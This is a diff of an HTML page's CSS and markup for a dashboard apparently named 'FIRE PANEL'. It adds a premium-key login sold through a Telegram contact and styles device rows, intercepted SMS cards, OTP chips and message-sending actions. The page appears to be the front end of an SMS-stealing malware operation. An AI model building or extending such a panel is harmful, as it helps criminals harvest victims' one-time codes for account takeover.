@@ -48,83 +48,100 @@ body::before {
   mask-image: linear-gradient(to bottom, rgba(0,0,0,0.6), transparent 72%);
 }
 
-button, input { font: inherit; }
+button, input, select { font: inherit; }
 button { -webkit-tap-highlight-color: transparent; }
 
-.header {
-  position: sticky;
-  top: 0;
-  z-index: 20;
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 14px;
-  padding: 14px 16px;
-  background: rgba(9, 11, 16, 0.78);
-  border-bottom: 1px solid var(--line);
-  backdrop-filter: blur(18px);
+/* Premium Overlay Styles */
+#premiumOverlay {
+  position: fixed; inset: 0; z-index: 100000;
+  background: rgba(9, 11, 16, 0.95);
+  backdrop-filter: blur(12px);
+  display: flex; align-items: center; justify-content: center;
+  padding: 20px;
 }
-.header-left { display: flex; align-items: center; gap: 12px; min-width: 0; }
-.avatar {
-  width: 42px;
-  height: 42px;
-  border: 1px solid rgba(255,255,255,0.18);
-  border-radius: 14px;
-  display: grid;
-  place-items: center;
-  flex: 0 0 auto;
+.premium-box {
+  width: 100%; max-width: 360px;
+  background: linear-gradient(180deg, rgba(19,23,31,0.9), rgba(9,11,16,0.95));
+  border: 1px solid rgba(251, 113, 133, 0.25);
+  border-radius: 24px; padding: 36px 24px;
+  box-shadow: 0 30px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05);
+  text-align: center;
+  animation: fadeUp 0.4s ease both;
+}
+.premium-title {
+  font-size: 28px; font-weight: 900; letter-spacing: 1px;
   background: linear-gradient(135deg, var(--red), var(--amber));
-  box-shadow: 0 12px 26px rgba(251, 113, 133, 0.18);
-  font-weight: 800;
-  font-size: 13px;
+  -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+  margin-bottom: 6px;
+  text-shadow: 0 0 20px rgba(251, 113, 133, 0.3);
 }
+.premium-sub { color: var(--muted); font-size: 13px; margin-bottom: 22px; font-weight: 500; }
+.premium-label { display: block; text-align: left; color: var(--text); font-weight: 800; font-size: 12px; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 0.5px; }
+
+/* NEW MODERN CONTACT OWNER BOX */
+.contact-owner-box {
+  margin-top: -10px;
+  margin-bottom: 28px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 10px;
+}
+.contact-owner-box .need-text {
+  font-size: 11px;
+  color: var(--muted-2);
+  text-transform: uppercase;
+  letter-spacing: 1.5px;
+  font-weight: 900;
+}
+.contact-owner-box .owner-link {
+  display: inline-flex;
+  align-items: center;
+  gap: 8px;
+  background: linear-gradient(135deg, rgba(56, 189, 248, 0.1), rgba(167, 139, 250, 0.1));
+  border: 1px solid rgba(56, 189, 248, 0.25);
+  border-radius: 999px;
+  padding: 10px 20px;
+  color: #dff7ff;
+  text-decoration: none;
+  font-weight: 850;
+  font-size: 13px;
+  transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+  box-shadow: 0 4px 15px rgba(56, 189, 248, 0.1);
+}
+.contact-owner-box .owner-link svg {
+  stroke: var(--blue);
+  transition: all 0.25s ease;
+}
+.contact-owner-box .owner-link:hover {
+  transform: translateY(-3px) scale(1.02);
+  border-color: rgba(56, 189, 248, 0.6);
+  color: #fff;
+  box-shadow: 0 8px 25px rgba(56, 189, 248, 0.35);
+  background: linear-gradient(135deg, rgba(56, 189, 248, 0.2), rgba(167, 139, 250, 0.2));
+}
+.contact-owner-box .owner-link:hover svg {
+  stroke: #fff;
+  transform: translateX(2px) translateY(-2px);
+}
+
+.header { position: sticky; top: 0; z-index: 20; display: flex; align-items: center; justify-content: space-between; gap: 14px; padding: 14px 16px; background: rgba(9, 11, 16, 0.78); border-bottom: 1px solid var(--line); backdrop-filter: blur(18px); }
+.header-left { display: flex; align-items: center; gap: 12px; min-width: 0; }
+.avatar { width: 42px; height: 42px; border: 1px solid rgba(255,255,255,0.18); border-radius: 14px; display: grid; place-items: center; flex: 0 0 auto; background: linear-gradient(135deg, var(--red), var(--amber)); box-shadow: 0 12px 26px rgba(251, 113, 133, 0.18); font-weight: 800; font-size: 13px; }
 .header-title { font-size: 18px; line-height: 1.05; font-weight: 850; letter-spacing: 0; }
 .header-owner { font-size: 11px; color: var(--red); font-weight: 850; letter-spacing: 0.5px; margin-top: 3px; text-shadow: 0 0 8px rgba(251, 113, 133, 0.4); }
 .header-sub { margin-top: 3px; font-size: 12px; color: var(--muted); }
 .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; margin-right: 6px; vertical-align: middle; }
 .dot-on { background: var(--green); box-shadow: 0 0 0 5px rgba(52, 211, 153, 0.1); }
 .dot-off { background: var(--red); box-shadow: 0 0 0 5px rgba(251, 113, 133, 0.1); }
-.refresh-btn {
-  min-height: 40px;
-  border: 1px solid rgba(56, 189, 248, 0.26);
-  border-radius: 12px;
-  padding: 0 14px;
-  color: #dff7ff;
-  background: linear-gradient(180deg, rgba(56,189,248,0.18), rgba(56,189,248,0.08));
-  cursor: pointer;
-  box-shadow: inset 0 1px 0 rgba(255,255,255,0.08);
-}
+.refresh-btn { min-height: 40px; border: 1px solid rgba(56, 189, 248, 0.26); border-radius: 12px; padding: 0 14px; color: #dff7ff; background: linear-gradient(180deg, rgba(56,189,248,0.18), rgba(56,189,248,0.08)); cursor: pointer; box-shadow: inset 0 1px 0 rgba(255,255,255,0.08); }
 .refresh-btn:active { transform: translateY(1px); }
 
-#homeDashboard, .summary, .search-wrap, .filter-tabs, .section {
-  width: min(1060px, 100%);
-  margin-inline: auto;
-}
+#homeDashboard, .summary, .search-wrap, .filter-tabs, .section { width: min(1060px, 100%); margin-inline: auto; }
 #homeDashboard { padding: 18px 14px 8px; }
-.summary {
-  display: grid;
-  grid-template-columns: repeat(4, minmax(0, 1fr));
-  gap: 12px;
-  padding: 16px 14px 12px;
-}
-.sum-card {
-  position: relative;
-  overflow: hidden;
-  border: 1px solid var(--line);
-  border-radius: 18px;
-  padding: 16px;
-  background: linear-gradient(180deg, rgba(255,255,255,0.08), rgba(255,255,255,0.04));
-  box-shadow: var(--shadow);
-}
-.sum-card::after {
-  content: "";
-  position: absolute;
-  inset: auto 14px 0;
-  height: 2px;
-  border-radius: 99px;
-  background: currentColor;
-  opacity: 0.7;
-}
+.summary { display: grid; grid-template-columns: repeat(4, minmax(0, 1fr)); gap: 12px; padding: 16px 14px 12px; }
+.sum-card { position: relative; overflow: hidden; border: 1px solid var(--line); border-radius: 18px; padding: 16px; background: linear-gradient(180deg, rgba(255,255,255,0.08), rgba(255,255,255,0.04)); box-shadow: var(--shadow); }
+.sum-card::after { content: ""; position: absolute; inset: auto 14px 0; height: 2px; border-radius: 99px; background: currentColor; opacity: 0.7; }
 .sum-label { margin-bottom: 8px; color: var(--muted); font-size: 12px; font-weight: 650; }
 .sum-val { font-size: clamp(24px, 5vw, 36px); line-height: 1; font-weight: 850; }
 .sum-val.blue { color: var(--blue); }
@@ -133,89 +150,31 @@ button { -webkit-tap-highlight-color: transparent; }
 .sum-val.red { color: var(--red); }
 
 .search-wrap { padding: 4px 14px 12px; }
-.search-input {
-  width: 100%;
-  height: 46px;
-  border: 1px solid var(--line);
-  border-radius: 14px;
-  padding: 0 15px;
-  outline: none;
-  color: var(--text);
-  background: rgba(255,255,255,0.065);
-  box-shadow: inset 0 1px 0 rgba(255,255,255,0.06);
-}
-.search-input:focus {
-  border-color: rgba(56,189,248,0.55);
-  box-shadow: 0 0 0 4px rgba(56,189,248,0.12);
-}
+.search-input { width: 100%; height: 46px; border: 1px solid var(--line); border-radius: 14px; padding: 0 15px; outline: none; color: var(--text); background: rgba(255,255,255,0.065); box-shadow: inset 0 1px 0 rgba(255,255,255,0.06); }
+.search-input:focus { border-color: rgba(56,189,248,0.55); box-shadow: 0 0 0 4px rgba(56,189,248,0.12); }
 .search-input::placeholder { color: var(--muted-2); }
 
-.filter-tabs {
-  display: flex;
-  gap: 8px;
-  padding: 0 14px 14px;
-  overflow-x: auto;
-  scrollbar-width: none;
-}
+.filter-tabs { display: flex; gap: 8px; padding: 0 14px 14px; overflow-x: auto; scrollbar-width: none; }
 .filter-tabs::-webkit-scrollbar { display: none; }
-.filter-tab {
-  flex: 0 0 auto;
-  min-height: 36px;
-  border: 1px solid var(--line);
-  border-radius: 999px;
-  padding: 0 14px;
-  color: var(--muted);
-  background: rgba(255,255,255,0.05);
-  cursor: pointer;
-}
-.filter-tab.active {
-  color: #061017;
-  border-color: transparent;
-  background: linear-gradient(135deg, #67e8f9, var(--blue));
-  font-weight: 800;
-}
+.filter-tab { flex: 0 0 auto; min-height: 36px; border: 1px solid var(--line); border-radius: 999px; padding: 0 14px; color: var(--muted); background: rgba(255,255,255,0.05); cursor: pointer; }
+.filter-tab.active { color: #061017; border-color: transparent; background: linear-gradient(135deg, #67e8f9, var(--blue)); font-weight: 800; }
 
 .section { padding: 0 14px 22px; }
 .sec-header { display: flex; align-items: center; justify-content: space-between; margin: 6px 0 10px; }
 .sec-label { color: var(--muted); font-size: 11px; font-weight: 800; text-transform: uppercase; letter-spacing: 0.08em; }
 .sec-count { color: var(--muted-2); font-size: 12px; }
 .card { display: grid; gap: 10px; background: transparent; border-radius: 0; overflow: visible; }
-.device-row {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  gap: 14px;
-  padding: 14px;
-  border: 1px solid var(--line);
-  border-radius: 16px;
-  background: var(--panel);
-  box-shadow: 0 12px 34px rgba(0, 0, 0, 0.2);
-  transition: transform .18s ease, border-color .18s ease, background .18s ease;
-}
+.device-row { display: flex; align-items: center; justify-content: space-between; gap: 14px; padding: 14px; border: 1px solid var(--line); border-radius: 16px; background: var(--panel); box-shadow: 0 12px 34px rgba(0, 0, 0, 0.2); transition: transform .18s ease, border-color .18s ease, background .18s ease; }
 .device-row:hover { transform: translateY(-1px); border-color: rgba(56,189,248,0.35); background: var(--card-hover); }
 .dev-left { flex: 1; min-width: 0; }
 .dev-phone { margin-bottom: 5px; font-size: 15px; font-weight: 800; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
-.dev-id {
-  max-width: min(54vw, 390px);
-  color: #8bdcff !important;
-  font-family: "SFMono-Regular", Consolas, ui-monospace, monospace;
-  font-size: 11px;
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-}
+.dev-id { max-width: min(54vw, 390px); color: #8bdcff !important; font-family: "SFMono-Regular", Consolas, ui-monospace, monospace; font-size: 11px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
 .dev-net { margin-top: 5px; color: var(--muted); font-size: 12px; }
 .dev-recent-list { display: grid; gap: 3px; margin-top: 7px; color: var(--muted); font-size: 11px; line-height: 1.25; }
 .dev-recent { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; max-width: min(58vw, 460px); }
 .dev-recent b { color: #dce7f5; font-weight: 800; }
 .dev-right { display: flex; flex-direction: column; align-items: flex-end; gap: 7px; flex: 0 0 auto; }
-.badge {
-  border: 1px solid currentColor;
-  border-radius: 999px;
-  padding: 4px 9px;
-  font-size: 10px;
-  font-weight: 850;
-}
+.badge { border: 1px solid currentColor; border-radius: 999px; padding: 4px 9px; font-size: 10px; font-weight: 850; }
 .badge-online { background: rgba(52,211,153,0.13); color: var(--green); }
 .badge-offline { background: rgba(154,166,184,0.10); color: var(--muted); }
 .badge-sent { background: rgba(56,189,248,0.13); color: var(--blue); }
@@ -228,186 +187,43 @@ button { -webkit-tap-highlight-color: transparent; }
 .batt-txt, .last-active { font-size: 11px; }
 .last-active { color: var(--muted-2); }
 
-.tab-bar {
-  position: fixed;
-  left: 50%;
-  right: auto;
-  bottom: 12px;
-  z-index: 30;
-  display: flex;
-  width: min(620px, calc(100% - 24px));
-  transform: translateX(-50%);
-  border: 1px solid var(--line);
-  border-radius: 20px;
-  padding: 8px;
-  background: rgba(16, 19, 26, 0.9);
-  box-shadow: var(--shadow);
-  backdrop-filter: blur(18px);
-}
-.tab {
-  flex: 1;
-  min-width: 0;
-  min-height: 50px;
-  border-radius: 14px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  justify-content: center;
-  gap: 4px;
-  color: var(--muted);
-  font-size: 10px;
-  cursor: pointer;
-}
+.tab-bar { position: fixed; left: 50%; right: auto; bottom: 12px; z-index: 30; display: flex; width: min(620px, calc(100% - 24px)); transform: translateX(-50%); border: 1px solid var(--line); border-radius: 20px; padding: 8px; background: rgba(16, 19, 26, 0.9); box-shadow: var(--shadow); backdrop-filter: blur(18px); }
+.tab { flex: 1; min-width: 0; min-height: 50px; border-radius: 14px; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 4px; color: var(--muted); font-size: 10px; cursor: pointer; }
 .tab.active { color: #061017; background: linear-gradient(135deg, #67e8f9, var(--blue)); font-weight: 850; }
 .tab svg { width: 21px; height: 21px; stroke: currentColor; fill: none; stroke-width: 1.9; }
 
-.loader, .empty {
-  margin: 14px 0;
-  border: 1px solid var(--line);
-  border-radius: 18px;
-  padding: 34px 18px;
-  text-align: center;
-  color: var(--muted);
-  background: var(--panel);
-}
-.spinner {
-  width: 30px;
-  height: 30px;
-  margin: 0 auto 12px;
-  border: 3px solid rgba(255,255,255,0.1);
-  border-top-color: var(--blue);
-  border-radius: 50%;
-  animation: spin 0.8s linear infinite;
-}
+.loader, .empty { margin: 14px 0; border: 1px solid var(--line); border-radius: 18px; padding: 34px 18px; text-align: center; color: var(--muted); background: var(--panel); }
+.spinner { width: 30px; height: 30px; margin: 0 auto 12px; border: 3px solid rgba(255,255,255,0.1); border-top-color: var(--blue); border-radius: 50%; animation: spin 0.8s linear infinite; }
 @keyframes spin { to { transform: rotate(360deg); } }
 @keyframes fadeUp { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
 .device-row, .sum-card { animation: fadeUp .32s ease both; }
 
-.dashboard-card, .quick-card, .terminal-card {
-  border: 1px solid var(--line) !important;
-  background: linear-gradient(180deg, rgba(255,255,255,0.08), rgba(255,255,255,0.045)) !important;
-  border-radius: 18px !important;
-  box-shadow: var(--shadow);
-}
+.dashboard-card, .quick-card, .terminal-card { border: 1px solid var(--line) !important; background: linear-gradient(180deg, rgba(255,255,255,0.08), rgba(255,255,255,0.045)) !important; border-radius: 18px !important; box-shadow: var(--shadow); }
 .dashboard-card { padding: 18px !important; margin-bottom: 14px !important; }
 .terminal-card { padding: 18px !important; margin-bottom: 14px !important; }
-.quick-grid { display: grid !important; grid-template-columns: repeat(2, minmax(0, 1fr)) !important; gap: 12px !important; }
-.quick-card { padding: 16px !important; }
-.pill {
-  display: inline-flex;
-  align-items: center;
-  min-height: 30px;
-  border: 1px solid rgba(52,211,153,0.28);
-  border-radius: 999px;
-  padding: 0 11px;
-  color: var(--green);
-  background: rgba(52,211,153,0.1);
-  font-size: 12px;
-  font-weight: 800;
-}
+.quick-grid { display: grid !important; grid-template-columns: repeat(3, minmax(0, 1fr)) !important; gap: 12px !important; }
+.quick-card { padding: 16px !important; text-align: center; }
+.pill { display: inline-flex; align-items: center; min-height: 30px; border: 1px solid rgba(52,211,153,0.28); border-radius: 999px; padding: 0 11px; color: var(--green); background: rgba(52,211,153,0.1); font-size: 12px; font-weight: 800; }
 .eyebrow { color: var(--muted); font-size: 11px; font-weight: 850; letter-spacing: 0.08em; text-transform: uppercase; }
-.big-time { margin-top: 13px; font-size: clamp(26px, 8vw, 42px); line-height: 1; font-weight: 900; }
+.big-time { margin-top: 13px; font-size: clamp(22px, 6vw, 36px); line-height: 1; font-weight: 900; }
 .big-time.unlimited { color: var(--green); text-shadow: 0 0 15px rgba(52, 211, 153, 0.4); letter-spacing: 1px; }
 
-.modal {
-  position: fixed;
-  inset: 0;
-  z-index: 9999;
-  display: none;
-  align-items: flex-end;
-  justify-content: center;
-  padding: 0 10px 10px;
-  background: rgba(0, 0, 0, 0.42) !important;
-  backdrop-filter: blur(8px);
-}
-.modal[style*="block"] {
-  display: flex !important;
-}
-.modal-panel {
-  width: min(760px, 100%);
-  height: min(80vh, 760px);
-  max-height: 80vh;
-  margin: 0 auto;
-  padding: 16px;
-  overflow: auto;
-  border: 1px solid var(--line);
-  border-bottom: none;
-  border-radius: 24px 24px 0 0;
-  background: linear-gradient(180deg, #111722, #080b10) !important;
-  box-shadow: 0 -24px 70px rgba(0,0,0,0.48);
-  animation: sheetUp .2s ease both;
-}
-.modal-top {
-  position: sticky;
-  top: 0;
-  z-index: 2;
-  display: flex;
-  align-items: center;
-  gap: 12px;
-  margin: -16px -16px 16px;
-  padding: 14px 16px;
-  border-bottom: 1px solid var(--line);
-  background: rgba(9, 11, 16, 0.82);
-  backdrop-filter: blur(18px);
-}
-@keyframes sheetUp {
-  from { transform: translateY(22px); opacity: 0; }
-  to { transform: translateY(0); opacity: 1; }
-}
-.back-btn {
-  min-height: 38px;
-  border: 1px solid var(--line);
-  border-radius: 12px;
-  padding: 0 12px;
-  color: var(--text);
-  background: rgba(255,255,255,0.07);
-  cursor: pointer;
-}
-.sheet-refresh-btn {
-  min-height: 38px;
-  margin-left: auto;
-  border: 1px solid rgba(56,189,248,0.28);
-  border-radius: 12px;
-  padding: 0 12px;
-  color: #dff7ff;
-  background: rgba(56,189,248,0.11);
-  cursor: pointer;
-  font-weight: 800;
-}
+.modal { position: fixed; inset: 0; z-index: 9999; display: none; align-items: flex-end; justify-content: center; padding: 0 10px 10px; background: rgba(0, 0, 0, 0.42) !important; backdrop-filter: blur(8px); }
+.modal[style*="block"] { display: flex !important; }
+.modal-panel { width: min(760px, 100%); height: min(80vh, 760px); max-height: 80vh; margin: 0 auto; padding: 16px; overflow: auto; border: 1px solid var(--line); border-bottom: none; border-radius: 24px 24px 0 0; background: linear-gradient(180deg, #111722, #080b10) !important; box-shadow: 0 -24px 70px rgba(0,0,0,0.48); animation: sheetUp .2s ease both; }
+.modal-top { position: sticky; top: 0; z-index: 2; display: flex; align-items: center; gap: 12px; margin: -16px -16px 16px; padding: 14px 16px; border-bottom: 1px solid var(--line); background: rgba(9, 11, 16, 0.82); backdrop-filter: blur(18px); }
+@keyframes sheetUp { from { transform: translateY(22px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+.back-btn { min-height: 38px; border: 1px solid var(--line); border-radius: 12px; padding: 0 12px; color: var(--text); background: rgba(255,255,255,0.07); cursor: pointer; }
+.sheet-refresh-btn { min-height: 38px; margin-left: auto; border: 1px solid rgba(56,189,248,0.28); border-radius: 12px; padding: 0 12px; color: #dff7ff; background: rgba(56,189,248,0.11); cursor: pointer; font-weight: 800; }
 .sheet-refresh-btn:disabled { opacity: .55; cursor: default; }
 .modal-title { font-size: 17px; font-weight: 850; }
-.toast {
-  position: fixed;
-  left: 50%;
-  bottom: 92px;
-  z-index: 12000;
-  transform: translateX(-50%) translateY(12px);
-  min-width: 190px;
-  max-width: calc(100% - 32px);
-  border: 1px solid var(--line);
-  border-radius: 999px;
-  padding: 11px 15px;
-  color: var(--text);
-  background: rgba(12, 16, 24, .94);
-  box-shadow: 0 18px 44px rgba(0,0,0,.38);
-  opacity: 0;
-  pointer-events: none;
-  text-align: center;
-  font-size: 13px;
-  font-weight: 850;
-  transition: opacity .18s ease, transform .18s ease;
-}
+.toast { position: fixed; left: 50%; bottom: 92px; z-index: 999999; transform: translateX(-50%) translateY(12px); min-width: 190px; max-width: calc(100% - 32px); border: 1px solid var(--line); border-radius: 999px; padding: 11px 15px; color: var(--text); background: rgba(12, 16, 24, .94); box-shadow: 0 18px 44px rgba(0,0,0,.38); opacity: 0; pointer-events: none; text-align: center; font-size: 13px; font-weight: 850; transition: opacity .18s ease, transform .18s ease; }
 .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
 .toast.ok { border-color: rgba(52,211,153,.35); color: var(--green); }
 .toast.info { border-color: rgba(156,163,175,.25); color: #d7deea; }
-.sms-card {
-  margin-bottom: 10px;
-  border: 1px solid var(--line);
-  border-left: 4px solid var(--blue);
-  border-radius: 16px;
-  padding: 13px;
-  background: var(--panel);
-}
+.toast.error { border-color: rgba(251,113,133,.35); color: var(--red); }
+
+.sms-card { margin-bottom: 10px; border: 1px solid var(--line); border-left: 4px solid var(--blue); border-radius: 16px; padding: 13px; background: var(--panel); }
 .sms-card-header { display: flex; justify-content: space-between; gap: 12px; color: var(--text); font-weight: 800; }
 .sms-card-time { color: var(--green); font-size: 11px; white-space: nowrap; }
 .sms-card-device { margin: 5px 0; color: var(--blue); cursor: pointer; font-size: 11px; text-decoration: none; overflow-wrap: anywhere; }
@@ -417,65 +233,41 @@ button { -webkit-tap-highlight-color: transparent; }
 .status-pill.badge-offline { background: rgba(156,163,175,0.14); color: var(--muted); }
 .status-pill.badge-other { background: rgba(255,255,255,0.08); color: #d6dbe4; }
 .otp-chip { display: inline-flex; margin-top: 8px; border-radius: 999px; padding: 5px 9px; color: #061017; background: var(--green); font-weight: 900; }
-.device-summary {
-  margin-bottom: 12px;
-  border: 1px solid rgba(56,189,248,0.24);
-  border-radius: 18px;
-  padding: 14px;
-  background: linear-gradient(180deg, rgba(56,189,248,0.10), rgba(255,255,255,0.045));
-}
-.device-summary-top {
-  display: flex;
-  align-items: flex-start;
-  justify-content: space-between;
-  gap: 12px;
-}
+.device-summary { margin-bottom: 12px; border: 1px solid rgba(56,189,248,0.24); border-radius: 18px; padding: 14px; background: linear-gradient(180deg, rgba(56,189,248,0.10), rgba(255,255,255,0.045)); }
+.device-summary-top { display: flex; align-items: flex-start; justify-content: space-between; gap: 12px; }
 .device-summary-title { font-size: 18px; font-weight: 900; }
-.device-summary-id {
-  margin-top: 5px;
-  color: #8bdcff;
-  font-family: "SFMono-Regular", Consolas, ui-monospace, monospace;
-  font-size: 11px;
-  overflow-wrap: anywhere;
-}
-.device-summary-grid {
-  display: grid;
-  grid-template-columns: repeat(2, minmax(0, 1fr));
-  gap: 8px;
-  margin-top: 12px;
-}
-.device-summary-stat {
-  border: 1px solid var(--line);
-  border-radius: 12px;
-  padding: 9px 10px;
-  background: rgba(0,0,0,0.12);
-}
+.device-summary-id { margin-top: 5px; color: #8bdcff; font-family: "SFMono-Regular", Consolas, ui-monospace, monospace; font-size: 11px; overflow-wrap: anywhere; }
+.device-summary-grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 8px; margin-top: 12px; }
+.device-summary-stat { border: 1px solid var(--line); border-radius: 12px; padding: 9px 10px; background: rgba(0,0,0,0.12); }
 .device-summary-label { color: var(--muted); font-size: 10px; font-weight: 800; text-transform: uppercase; letter-spacing: .06em; }
 .device-summary-value { margin-top: 4px; color: var(--text); font-size: 12px; font-weight: 800; overflow-wrap: anywhere; }
-.load-more {
-  min-height: 44px;
-  width: 100%;
-  margin-top: 12px;
-  border: 1px solid rgba(56,189,248,0.28);
-  border-radius: 14px;
-  color: #dff7ff;
-  background: rgba(56,189,248,0.11);
-  cursor: pointer;
-  font-weight: 800;
-}
+.load-more { min-height: 44px; width: 100%; margin-top: 12px; border: 1px solid rgba(56,189,248,0.28); border-radius: 14px; color: #dff7ff; background: rgba(56,189,248,0.11); cursor: pointer; font-weight: 800; }
+
+.modal-tabs { display: flex; gap: 10px; margin-bottom: 15px; }
+.modal-tab { flex: 1; min-height: 42px; display: flex; align-items: center; justify-content: center; border: 1px solid var(--line); border-radius: 12px; background: rgba(255,255,255,0.04); color: var(--muted); font-weight: 800; font-size: 13px; cursor: pointer; transition: all 0.2s; }
+.modal-tab.active { background: linear-gradient(135deg, var(--red), var(--amber)); color: #fff; border-color: transparent; box-shadow: 0 8px 20px rgba(251, 113, 133, 0.25); }
+
+.action-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 20px; }
+.act-btn { background: rgba(255,255,255,0.03); border: 1px solid var(--line); border-radius: 16px; padding: 16px 12px; display: flex; flex-direction: column; align-items: center; gap: 10px; color: var(--text); font-weight: 750; font-size: 12px; cursor: pointer; transition: all 0.2s; outline: none; }
+.act-btn svg { width: 26px; height: 26px; stroke: var(--blue); }
+.act-btn.red svg { stroke: var(--red); }
+.act-btn:hover { background: rgba(56, 189, 248, 0.1); border-color: rgba(56, 189, 248, 0.3); transform: translateY(-2px); }
+.act-btn.red:hover { background: rgba(251, 113, 133, 0.1); border-color: rgba(251, 113, 133, 0.3); }
+
+.act-form { background: rgba(255,255,255,0.02); border: 1px solid var(--line); border-radius: 16px; padding: 16px; }
+.act-input, .act-textarea { width: 100%; background: rgba(0,0,0,0.2); border: 1px solid var(--line); border-radius: 12px; padding: 14px; color: var(--text); font-family: inherit; font-size: 13px; outline: none; margin-bottom: 12px; }
+.act-input:focus, .act-textarea:focus { border-color: var(--amber); }
+select.act-input option { background: #090b10; color: #fff; }
+.act-textarea { resize: none; min-height: 80px; }
+.act-send { width: 100%; background: linear-gradient(135deg, var(--green), #10b981); color: #000; border: none; border-radius: 12px; padding: 14px; font-weight: 850; font-size: 14px; cursor: pointer; box-shadow: 0 8px 20px rgba(52, 211, 153, 0.3); transition: all 0.2s; }
+.act-send:active { transform: scale(0.97); }
 
 @media (max-width: 720px) {
   .summary { grid-template-columns: repeat(2, minmax(0, 1fr)); }
   .header { padding-inline: 12px; }
   .refresh-btn { padding-inline: 11px; font-size: 12px; }
   .modal { padding: 0; }
-  .modal-panel {
-    width: 100%;
-    height: 80vh;
-    max-height: 80vh;
-    border-left: none;
-    border-right: none;
-  }
+  .modal-panel { width: 100%; height: 80vh; max-height: 80vh; border-left: none; border-right: none; }
 }
 @media (max-width: 420px) {
   body { font-size: 13px; }
@@ -483,59 +275,63 @@ button { -webkit-tap-highlight-color: transparent; }
   .header-title { font-size: 16px; }
   .device-row { align-items: flex-start; }
   .dev-right { gap: 6px; }
-  .quick-grid { grid-template-columns: 1fr !important; }
   .device-summary-grid { grid-template-columns: 1fr; }
   .tab { font-size: 9px; }
 }
 
-.copy-btn {
-  display: inline-flex; align-items: center; justify-content: center;
-  width: 30px; height: 30px; margin-left: 8px;
-  border: 1px solid rgba(255,255,255, 0.12); border-radius: 9px;
-  background: rgba(255,255,255, 0.05); color: var(--muted);
-  cursor: pointer; transition: all 0.15s ease; outline: none;
-}
-.copy-btn:hover {
-  color: var(--text); border-color: rgba(56, 189, 248, 0.4);
-  background: rgba(56, 189, 248, 0.12); box-shadow: 0 0 12px rgba(56, 189, 248, 0.2);
-}
+.copy-btn { display: inline-flex; align-items: center; justify-content: center; width: 30px; height: 30px; margin-left: 8px; border: 1px solid rgba(255,255,255, 0.12); border-radius: 9px; background: rgba(255,255,255, 0.05); color: var(--muted); cursor: pointer; transition: all 0.15s ease; outline: none; }
+.copy-btn:hover { color: var(--text); border-color: rgba(56, 189, 248, 0.4); background: rgba(56, 189, 248, 0.12); box-shadow: 0 0 12px rgba(56, 189, 248, 0.2); }
 .copy-btn:active { transform: scale(0.96); }
 .copy-btn svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2.2; stroke-linecap: round; stroke-linejoin: round; }
 
-
-/* Modern Fav Button */
-.fav-btn {
-  display: inline-flex; align-items: center; justify-content: center;
-  width: 30px; height: 30px; margin-left: 6px;
-  border: 1px solid rgba(255,255,255, 0.12); border-radius: 9px;
-  background: rgba(255,255,255, 0.05); color: var(--muted);
-  cursor: pointer; transition: all 0.15s ease; outline: none;
-}
-.fav-btn:hover {
-  color: var(--text); border-color: rgba(255,255,255,0.3); background: rgba(255,255,255,0.1);
-}
+.fav-btn { display: inline-flex; align-items: center; justify-content: center; width: 30px; height: 30px; margin-left: 6px; border: 1px solid rgba(255,255,255, 0.12); border-radius: 9px; background: rgba(255,255,255, 0.05); color: var(--muted); cursor: pointer; transition: all 0.15s ease; outline: none; }
+.fav-btn:hover { color: var(--text); border-color: rgba(255,255,255,0.3); background: rgba(255,255,255,0.1); }
 .fav-btn:active { transform: scale(0.96); }
-.fav-btn svg { 
-  width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2; 
-  stroke-linecap: round; stroke-linejoin: round; transition: all 0.15s ease; 
-}
-/* Starred State */
-.fav-btn.starred {
-  border-color: rgba(251, 191, 36, 0.4);
-  background: rgba(251, 191, 36, 0.12);
-  color: var(--amber); /* Yellow/Amber color */
-  box-shadow: 0 0 12px rgba(251, 191, 36, 0.2);
-}
-.fav-btn.starred svg {
-  fill: var(--amber);
-  stroke: var(--amber);
-}
-
+.fav-btn svg { width: 14px; height: 14px; fill: none; stroke: currentColor; stroke-width: 2; stroke-linecap: round; stroke-linejoin: round; transition: all 0.15s ease; }
+.fav-btn.starred { border-color: rgba(251, 191, 36, 0.4); background: rgba(251, 191, 36, 0.12); color: var(--amber); box-shadow: 0 0 12px rgba(251, 191, 36, 0.2); }
+.fav-btn.starred svg { fill: var(--amber); stroke: var(--amber); }
 </style>
 </head>
 <body>
 
-<div class="header">
+<div id="premiumOverlay" style="display: none;">
+  <div class="premium-box">
+    <h2 class="premium-title">FIRE PANEL</h2>
+    <p class="premium-sub">Premium Access Required</p>
+    
+    <div class="contact-owner-box">
+      <span class="need-text">Need Key?</span>
+      <a href="https://t.me/NonsenseBy" target="_blank" class="owner-link">
+        <svg viewBox="0 0 24 24" width="16" height="16" stroke="currentColor" stroke-width="2.5" fill="none" stroke-linecap="round" stroke-linejoin="round">
+            <line x1="22" y1="2" x2="11" y2="13"></line>
+            <polygon points="22 2 15 22 11 13 2 9 22 2"></polygon>
+        </svg>
+        Contact Owner - @NonsenseBy
+      </a>
+    </div>
+    <div style="text-align: left; margin-bottom: 18px;">
+       <label class="premium-label">API Key</label>
+       <input type="text" id="premiumKeyInput" class="act-input" placeholder="Enter your premium API key..." style="margin-bottom: 0;">
+    </div>
+    <button class="act-send" onclick="window.savePremiumKey()">Login</button>
+  </div>
+</div>
+
